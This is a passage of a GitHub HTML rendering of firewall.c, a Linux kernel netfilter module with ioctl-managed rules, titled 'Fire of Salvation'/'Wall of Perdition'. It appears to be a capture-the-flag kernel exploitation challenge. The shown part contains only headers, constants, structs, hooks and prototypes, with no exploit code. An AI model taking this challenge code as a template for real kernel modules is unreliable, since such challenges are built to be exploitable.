          <td id="file-firewall-c-LC12" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/netfilter.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-firewall-c-LC13" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/netfilter_ipv4.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-firewall-c-LC14" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/net.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-firewall-c-LC15" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/in.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-firewall-c-LC16" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/skbuff.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-firewall-c-LC17" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/ip.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-firewall-c-LC18" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/inet.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-firewall-c-LC19" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/tcp.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-firewall-c-LC20" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>linux/udp.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-firewall-c-LC21" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-firewall-c-LC22" class="blob-code blob-code-inner js-file-line"><span class="pl-en">MODULE_AUTHOR</span>(<span class="pl-s"><span class="pl-pds">"</span>FizzBuzz and D3v17<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-firewall-c-LC23" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">ifdef</span> EASYMODE</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-firewall-c-LC24" class="blob-code blob-code-inner js-file-line"><span class="pl-en">MODULE_DESCRIPTION</span>(<span class="pl-s"><span class="pl-pds">"</span>Fire of Salvation<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-firewall-c-LC25" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">endif</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-firewall-c-LC26" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">ifndef</span> EASY_MODE</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-firewall-c-LC27" class="blob-code blob-code-inner js-file-line"><span class="pl-en">MODULE_DESCRIPTION</span>(<span class="pl-s"><span class="pl-pds">"</span>Wall of Perdition<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-firewall-c-LC28" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">endif</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-firewall-c-LC29" class="blob-code blob-code-inner js-file-line"><span class="pl-en">MODULE_LICENSE</span>(<span class="pl-s"><span class="pl-pds">"</span>GPL<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-firewall-c-LC30" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-firewall-c-LC31" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-firewall-c-LC32" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-firewall-c-LC33" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DEVICE_NAME</span> <span class="pl-s"><span class="pl-pds">"</span>firewall<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L34" class="blob-num js-line-number js-code-nav-line-number" data-line-number="34"></td>
          <td id="file-firewall-c-LC34" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">CLASS_NAME</span>  <span class="pl-s"><span class="pl-pds">"</span>firewall<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L35" class="blob-num js-line-number js-code-nav-line-number" data-line-number="35"></td>
          <td id="file-firewall-c-LC35" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L36" class="blob-num js-line-number js-code-nav-line-number" data-line-number="36"></td>
          <td id="file-firewall-c-LC36" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">ADD_RULE</span> <span class="pl-c1">0x1337babe</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L37" class="blob-num js-line-number js-code-nav-line-number" data-line-number="37"></td>
          <td id="file-firewall-c-LC37" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DELETE_RULE</span> <span class="pl-c1">0xdeadbabe</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L38" class="blob-num js-line-number js-code-nav-line-number" data-line-number="38"></td>
          <td id="file-firewall-c-LC38" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">EDIT_RULE</span> <span class="pl-c1">0x1337beef</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L39" class="blob-num js-line-number js-code-nav-line-number" data-line-number="39"></td>
          <td id="file-firewall-c-LC39" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SHOW_RULE</span> <span class="pl-c1">0xdeadbeef</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L40" class="blob-num js-line-number js-code-nav-line-number" data-line-number="40"></td>
          <td id="file-firewall-c-LC40" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DUP_RULE</span> <span class="pl-c1">0xbaad5aad</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L41" class="blob-num js-line-number js-code-nav-line-number" data-line-number="41"></td>
          <td id="file-firewall-c-LC41" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L42" class="blob-num js-line-number js-code-nav-line-number" data-line-number="42"></td>
          <td id="file-firewall-c-LC42" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">ERROR</span> -<span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L43" class="blob-num js-line-number js-code-nav-line-number" data-line-number="43"></td>
          <td id="file-firewall-c-LC43" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SUCCESS</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L44" class="blob-num js-line-number js-code-nav-line-number" data-line-number="44"></td>
          <td id="file-firewall-c-LC44" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">MAX_RULES</span> <span class="pl-c1">0x80</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L45" class="blob-num js-line-number js-code-nav-line-number" data-line-number="45"></td>
          <td id="file-firewall-c-LC45" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L46" class="blob-num js-line-number js-code-nav-line-number" data-line-number="46"></td>
          <td id="file-firewall-c-LC46" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">INBOUND</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L47" class="blob-num js-line-number js-code-nav-line-number" data-line-number="47"></td>
          <td id="file-firewall-c-LC47" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">OUTBOUND</span> <span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L48" class="blob-num js-line-number js-code-nav-line-number" data-line-number="48"></td>
          <td id="file-firewall-c-LC48" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SKIP</span> -<span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L49" class="blob-num js-line-number js-code-nav-line-number" data-line-number="49"></td>
          <td id="file-firewall-c-LC49" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L50" class="blob-num js-line-number js-code-nav-line-number" data-line-number="50"></td>
          <td id="file-firewall-c-LC50" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">ifdef</span> EASY_MODE</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L51" class="blob-num js-line-number js-code-nav-line-number" data-line-number="51"></td>
          <td id="file-firewall-c-LC51" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">DESC_MAX</span> <span class="pl-c1">0x800</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L52" class="blob-num js-line-number js-code-nav-line-number" data-line-number="52"></td>
          <td id="file-firewall-c-LC52" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">endif</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L53" class="blob-num js-line-number js-code-nav-line-number" data-line-number="53"></td>
          <td id="file-firewall-c-LC53" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L54" class="blob-num js-line-number js-code-nav-line-number" data-line-number="54"></td>
          <td id="file-firewall-c-LC54" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L55" class="blob-num js-line-number js-code-nav-line-number" data-line-number="55"></td>
          <td id="file-firewall-c-LC55" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L56" class="blob-num js-line-number js-code-nav-line-number" data-line-number="56"></td>
          <td id="file-firewall-c-LC56" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> iface[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L57" class="blob-num js-line-number js-code-nav-line-number" data-line-number="57"></td>
          <td id="file-firewall-c-LC57" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> name[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L58" class="blob-num js-line-number js-code-nav-line-number" data-line-number="58"></td>
          <td id="file-firewall-c-LC58" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> ip[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L59" class="blob-num js-line-number js-code-nav-line-number" data-line-number="59"></td>
          <td id="file-firewall-c-LC59" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> netmask[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L60" class="blob-num js-line-number js-code-nav-line-number" data-line-number="60"></td>
          <td id="file-firewall-c-LC60" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> idx;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L61" class="blob-num js-line-number js-code-nav-line-number" data-line-number="61"></td>
          <td id="file-firewall-c-LC61" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> type;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L62" class="blob-num js-line-number js-code-nav-line-number" data-line-number="62"></td>
          <td id="file-firewall-c-LC62" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint16_t</span> proto;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L63" class="blob-num js-line-number js-code-nav-line-number" data-line-number="63"></td>
          <td id="file-firewall-c-LC63" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint16_t</span> port;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L64" class="blob-num js-line-number js-code-nav-line-number" data-line-number="64"></td>
          <td id="file-firewall-c-LC64" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> action;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L65" class="blob-num js-line-number js-code-nav-line-number" data-line-number="65"></td>
          <td id="file-firewall-c-LC65" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">ifdef</span> EASY_MODE</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L66" class="blob-num js-line-number js-code-nav-line-number" data-line-number="66"></td>
          <td id="file-firewall-c-LC66" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> desc[DESC_MAX];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L67" class="blob-num js-line-number js-code-nav-line-number" data-line-number="67"></td>
          <td id="file-firewall-c-LC67" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">endif</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L68" class="blob-num js-line-number js-code-nav-line-number" data-line-number="68"></td>
          <td id="file-firewall-c-LC68" class="blob-code blob-code-inner js-file-line">} <span class="pl-c1">user_rule_t</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L69" class="blob-num js-line-number js-code-nav-line-number" data-line-number="69"></td>
          <td id="file-firewall-c-LC69" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L70" class="blob-num js-line-number js-code-nav-line-number" data-line-number="70"></td>
          <td id="file-firewall-c-LC70" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L71" class="blob-num js-line-number js-code-nav-line-number" data-line-number="71"></td>
          <td id="file-firewall-c-LC71" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L72" class="blob-num js-line-number js-code-nav-line-number" data-line-number="72"></td>
          <td id="file-firewall-c-LC72" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> iface[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L73" class="blob-num js-line-number js-code-nav-line-number" data-line-number="73"></td>
          <td id="file-firewall-c-LC73" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> name[<span class="pl-c1">16</span>];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L74" class="blob-num js-line-number js-code-nav-line-number" data-line-number="74"></td>
          <td id="file-firewall-c-LC74" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> ip;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L75" class="blob-num js-line-number js-code-nav-line-number" data-line-number="75"></td>
          <td id="file-firewall-c-LC75" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> netmask;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L76" class="blob-num js-line-number js-code-nav-line-number" data-line-number="76"></td>
          <td id="file-firewall-c-LC76" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint16_t</span> proto;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L77" class="blob-num js-line-number js-code-nav-line-number" data-line-number="77"></td>
          <td id="file-firewall-c-LC77" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint16_t</span> port;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L78" class="blob-num js-line-number js-code-nav-line-number" data-line-number="78"></td>
          <td id="file-firewall-c-LC78" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> action;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L79" class="blob-num js-line-number js-code-nav-line-number" data-line-number="79"></td>
          <td id="file-firewall-c-LC79" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint8_t</span> is_duplicated;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L80" class="blob-num js-line-number js-code-nav-line-number" data-line-number="80"></td>
          <td id="file-firewall-c-LC80" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">ifdef</span> EASY_MODE</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L81" class="blob-num js-line-number js-code-nav-line-number" data-line-number="81"></td>
          <td id="file-firewall-c-LC81" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> desc[DESC_MAX];</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L82" class="blob-num js-line-number js-code-nav-line-number" data-line-number="82"></td>
          <td id="file-firewall-c-LC82" class="blob-code blob-code-inner js-file-line">    #<span class="pl-k">endif</span></td>
        </tr>
        <tr>
          <td id="file-firewall-c-L83" class="blob-num js-line-number js-code-nav-line-number" data-line-number="83"></td>
          <td id="file-firewall-c-LC83" class="blob-code blob-code-inner js-file-line">} <span class="pl-c1">rule_t</span>;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L84" class="blob-num js-line-number js-code-nav-line-number" data-line-number="84"></td>
          <td id="file-firewall-c-LC84" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L85" class="blob-num js-line-number js-code-nav-line-number" data-line-number="85"></td>
          <td id="file-firewall-c-LC85" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">rule_t</span> **firewall_rules_in;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L86" class="blob-num js-line-number js-code-nav-line-number" data-line-number="86"></td>
          <td id="file-firewall-c-LC86" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">rule_t</span> **firewall_rules_out;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L87" class="blob-num js-line-number js-code-nav-line-number" data-line-number="87"></td>
          <td id="file-firewall-c-LC87" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L88" class="blob-num js-line-number js-code-nav-line-number" data-line-number="88"></td>
          <td id="file-firewall-c-LC88" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-en">DEFINE_MUTEX</span>(firewall_lock);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L89" class="blob-num js-line-number js-code-nav-line-number" data-line-number="89"></td>
          <td id="file-firewall-c-LC89" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L90" class="blob-num js-line-number js-code-nav-line-number" data-line-number="90"></td>
          <td id="file-firewall-c-LC90" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_ioctl</span>(<span class="pl-k">struct</span> file *file, <span class="pl-k">unsigned</span> <span class="pl-k">int</span> cmd, <span class="pl-k">unsigned</span> <span class="pl-k">long</span> arg);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L91" class="blob-num js-line-number js-code-nav-line-number" data-line-number="91"></td>
          <td id="file-firewall-c-LC91" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-c1">uint32_t</span> <span class="pl-en">firewall_inbound_hook</span>(<span class="pl-k">void</span> *priv, <span class="pl-k">struct</span> sk_buff *skb, <span class="pl-k">const</span> <span class="pl-k">struct</span> nf_hook_state *state);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L92" class="blob-num js-line-number js-code-nav-line-number" data-line-number="92"></td>
          <td id="file-firewall-c-LC92" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-c1">uint32_t</span> <span class="pl-en">firewall_outbound_hook</span>(<span class="pl-k">void</span> *priv, <span class="pl-k">struct</span> sk_buff *skb, <span class="pl-k">const</span> <span class="pl-k">struct</span> nf_hook_state *state);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L93" class="blob-num js-line-number js-code-nav-line-number" data-line-number="93"></td>
          <td id="file-firewall-c-LC93" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-c1">uint32_t</span> <span class="pl-en">process_rule</span>(<span class="pl-k">struct</span> sk_buff *skb, <span class="pl-c1">rule_t</span> *rule, <span class="pl-c1">uint8_t</span> type, <span class="pl-k">int</span> i);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L94" class="blob-num js-line-number js-code-nav-line-number" data-line-number="94"></td>
          <td id="file-firewall-c-LC94" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_add_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L95" class="blob-num js-line-number js-code-nav-line-number" data-line-number="95"></td>
          <td id="file-firewall-c-LC95" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_delete_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L96" class="blob-num js-line-number js-code-nav-line-number" data-line-number="96"></td>
          <td id="file-firewall-c-LC96" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_edit_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L97" class="blob-num js-line-number js-code-nav-line-number" data-line-number="97"></td>
          <td id="file-firewall-c-LC97" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_show_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L98" class="blob-num js-line-number js-code-nav-line-number" data-line-number="98"></td>
          <td id="file-firewall-c-LC98" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">firewall_dup_rule</span>(<span class="pl-c1">user_rule_t</span> user_rule, <span class="pl-c1">rule_t</span> **firewall_rules, <span class="pl-c1">uint8_t</span> idx);</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L99" class="blob-num js-line-number js-code-nav-line-number" data-line-number="99"></td>
          <td id="file-firewall-c-LC99" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L100" class="blob-num js-line-number js-code-nav-line-number" data-line-number="100"></td>
          <td id="file-firewall-c-LC100" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">struct</span> miscdevice firewall_device;</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L101" class="blob-num js-line-number js-code-nav-line-number" data-line-number="101"></td>
          <td id="file-firewall-c-LC101" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">struct</span> file_operations firewall_fops = {.<span class="pl-smi">unlocked_ioctl</span> = firewall_ioctl};</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L102" class="blob-num js-line-number js-code-nav-line-number" data-line-number="102"></td>
          <td id="file-firewall-c-LC102" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L103" class="blob-num js-line-number js-code-nav-line-number" data-line-number="103"></td>
          <td id="file-firewall-c-LC103" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">struct</span> nf_hook_ops in_hook = {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L104" class="blob-num js-line-number js-code-nav-line-number" data-line-number="104"></td>
          <td id="file-firewall-c-LC104" class="blob-code blob-code-inner js-file-line">  .<span class="pl-smi">hook</span>        = firewall_inbound_hook,</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L105" class="blob-num js-line-number js-code-nav-line-number" data-line-number="105"></td>
          <td id="file-firewall-c-LC105" class="blob-code blob-code-inner js-file-line">  .<span class="pl-smi">hooknum</span>     = NF_INET_PRE_ROUTING,</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L106" class="blob-num js-line-number js-code-nav-line-number" data-line-number="106"></td>
          <td id="file-firewall-c-LC106" class="blob-code blob-code-inner js-file-line">  .<span class="pl-smi">pf</span>          = PF_INET,</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L107" class="blob-num js-line-number js-code-nav-line-number" data-line-number="107"></td>
          <td id="file-firewall-c-LC107" class="blob-code blob-code-inner js-file-line">  .<span class="pl-smi">priority</span>    = NF_IP_PRI_FIRST</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L108" class="blob-num js-line-number js-code-nav-line-number" data-line-number="108"></td>
          <td id="file-firewall-c-LC108" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L109" class="blob-num js-line-number js-code-nav-line-number" data-line-number="109"></td>
          <td id="file-firewall-c-LC109" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L110" class="blob-num js-line-number js-code-nav-line-number" data-line-number="110"></td>
          <td id="file-firewall-c-LC110" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">struct</span> nf_hook_ops out_hook = {</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L111" class="blob-num js-line-number js-code-nav-line-number" data-line-number="111"></td>
          <td id="file-firewall-c-LC111" class="blob-code blob-code-inner js-file-line">  .<span class="pl-smi">hook</span>        = firewall_outbound_hook,</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L112" class="blob-num js-line-number js-code-nav-line-number" data-line-number="112"></td>
          <td id="file-firewall-c-LC112" class="blob-code blob-code-inner js-file-line">  .<span class="pl-smi">hooknum</span>     = NF_INET_POST_ROUTING,</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L113" class="blob-num js-line-number js-code-nav-line-number" data-line-number="113"></td>
          <td id="file-firewall-c-LC113" class="blob-code blob-code-inner js-file-line">  .<span class="pl-smi">pf</span>          = PF_INET,</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L114" class="blob-num js-line-number js-code-nav-line-number" data-line-number="114"></td>
          <td id="file-firewall-c-LC114" class="blob-code blob-code-inner js-file-line">  .<span class="pl-smi">priority</span>    = NF_IP_PRI_FIRST</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L115" class="blob-num js-line-number js-code-nav-line-number" data-line-number="115"></td>
          <td id="file-firewall-c-LC115" class="blob-code blob-code-inner js-file-line">};</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L116" class="blob-num js-line-number js-code-nav-line-number" data-line-number="116"></td>
          <td id="file-firewall-c-LC116" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L117" class="blob-num js-line-number js-code-nav-line-number" data-line-number="117"></td>
          <td id="file-firewall-c-LC117" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-firewall-c-L118" class="blob-num js-line-number js-code-nav-line-number" data-line-number="118"></td>
